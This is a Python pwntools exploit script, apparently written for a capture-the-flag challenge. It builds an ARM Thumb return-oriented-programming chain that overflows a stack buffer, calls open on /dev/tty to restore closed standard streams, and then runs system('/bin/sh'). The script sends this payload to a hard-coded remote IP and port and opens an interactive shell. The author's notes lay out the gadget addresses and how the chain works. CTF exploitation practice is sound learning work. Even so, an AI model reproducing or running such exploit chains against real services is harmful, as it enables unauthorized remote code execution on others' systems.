#!/usr/bin/env python3
from pwn import *
import os

context.binary = "./main_fixed"

# rops
rop_r1_t_adr = 0x0003777e # ; pop {r1, pc} !thumb
rop_mov_r0_r6_t_adr = 0x00010d2c  # ; mov r0,r6 / pop {r4, r5, r6, pc}

rop_add_sp_0xc_t_adr = 0x00014532  # ; add sp,#0xc / pop {r4, r5, pc}
rop_add_sp_0x28_t_adr = 0x00040380  # ; add sp, #0x28 ; pop {r4, pc}

rop_pop_lr_t_adr = 0x00045f5a  # ; pop.w {r4, lr} / nop.w / pop {r4, pc}

rop_mov_r0_r1_t_adr = 0x00022fde  # ; mov r0 r1 / bx lr

rop_open_t_adr = 0x00021dac  # open
rop_system_t_adr = 0x00014c10  # system
rop_sice_t_adr = 0x00010424  # sice

rop_set_r0_t_adr = 0x00034f6c  # ; pop {r0, r6, pc}

location_bin_sh = 0x0004b004  # string "/bin/sh"
location_date = 0x0004ab60  # string "date +'%s'"

"""
What I want to have

This is a bit complicated actually, but essentially I can jump recursevly into pop instructions and fill my buffers with such

Open question is how I get control over the stack to inject my /dev/tty or similar

Okay. Helpful:
  - r8 seems to be set to the stackpointer at a known and stable offset from sp. 
    Assumption is 364 bytes after sp in func vuln
  - so overwrite stuff in r8
  - then r0 needs to be set to r8
    - see addr 0x00020ca8
       0x00020ca8               4046  mov r0, r8
       0x00020caa               02b0  add sp, 8
       0x00020cac           bde8f087  pop.w {r4, r5, r6, r7, r8, sb, sl, pc}
  - call open

non thumb:
  0x0003df1c : pop {r4, r6, r7, fp, ip, lr, pc}
    - doesn't pop r8, but sets lr and pc


What happens in the binary:
  - binary is fully statically linked and included libc functions have stack canaries
  - using the `system` function, binaries like date can be called
  - string `/bin/sh` is already provided at location $location_bin_sh
  - issue is:
    - before we can intervene stdout, stdin and stderr are closed (file pointers 0, 1 and 2)
    - we can recover those by calling into open with e.g. /dev/tty

How the rop chain works:

1. set r1 to 2 (RW)
2. use r6 as pointer into stack -> need to mov it into r0
3. (overflow might not be required anymore)
4. call open and use gadget to move sp by 0xc bytes
    a. move r1 into r0
    b. set r1 to 2
    c. repeat
5. call system with bin_sh location

"""

def build_lr(lr, r4=0):
    payload = p32(rop_pop_lr_t_adr + 1)
    payload += p32(0) + p32(lr) + p32(r4)
    return payload

def build_mov_r0_r6_t(r4, r5, r6):
    payload = p32(rop_mov_r0_r6_t_adr + 1)
    payload += p32(r4) + p32(r5) + p32(r6)
    return payload

def mov_r0_r1_t(pc):
    payload = build_lr(lr=pc)
    payload += p32(rop_mov_r0_r1_t_adr + 1)
    return payload

def call_open_t(next_pc):
    # set lr to next instruction after open
    payload = build_lr(lr=next_pc)
    payload += p32(rop_open_t_adr + 1)  # do open once
    return payload

def build_set_r0(r0, r6):
    payload = p32(rop_set_r0_t_adr + 1)
    payload += p32(r0) + p32(r6)
    return payload


if True:
    tty_path = b"/dev/tty\x00"
    #tty_path = b"/dev/pts/9\x00"

    payload = b"0" * 0x20
    payload += b"1" * 4

    # trying to execute rop_r1_t_adr in thumb mode
    payload += p32(rop_r1_t_adr + 1)
    # write to r1
    payload += p32(os.O_RDWR)

    # move r6 to r0
    payload += build_mov_r0_r6_t(0, 0, 0)

    payload += p32(rop_add_sp_0x28_t_adr + 1)
    prev_len = len(payload)

    payload += b"0" * (40 - (len(payload) - 0x20))
    payload += tty_path
    payload += b"0" * ((prev_len + 0x28) - len(payload) + 4)

    payload += p32(rop_add_sp_0x28_t_adr + 1)
    payload += b"0" * 0x28
    payload += b"0" * (4)  # for add sp (2 args)

    # do open
    payload += call_open_t(rop_add_sp_0x28_t_adr + 1)
    payload += b"0" * 0x28

    # move r1 to r0 and set r1 = O_RDRW
    payload += b"0" * (4)  # for add sp (2 args)
    payload += mov_r0_r1_t(rop_r1_t_adr + 1)
    payload += p32(os.O_WRONLY)

    # payload += call_open_t(rop_add_sp_0x28_t_adr + 1)
    # # open uses 16bytes of stack, reserve it
    # payload += b"0" * 0x28
    # payload += b"0" * (4)  # for add sp (2 args)

    # payload += mov_r0_r1_t(rop_r1_t_adr + 1)
    # payload += p32(os.O_WRONLY)

    payload += call_open_t(rop_add_sp_0x28_t_adr + 1)
    # open uses 16bytes of stack, reserve it
    payload += b"0" * 0x28
    payload += b"0" * (4)  # for add sp (two args)

    # NOW WE CAN USE ROP TO CALL SYSTEM !!!!!!! (I'm so tired)
    payload += build_set_r0(location_bin_sh, 0)
    payload += p32(rop_system_t_adr + 1)
    print(len(payload))

    print(f"Payload Length: 0x{len(payload):x}")

    assert(len(payload) < 340)
else:
    payload = b"0" * 0x192
    # with 0x200 bytes calls to system don't resolve
    ...
with open("/local-tmp/payload", "bw") as fp:
    fp.write(payload + b"\n")
    fp.write(b"ls")

if True:
    r = remote("34.125.56.151", 2222, ssl=False)
    r.sendline(payload)
    r.interactive()
    exit()

io = gdb.debug(context.binary.path, gdbscript="""
source /home/elizabeth/Documents/Projects/ccc/ctfriday-bsidesindore23/pwndbg/gdbinit.py
b *0x00021dac
b *0x010488
b *0x00014c10
c
""")
#io = process(context.binary.path)
io.sendline(payload)
io.interactive()
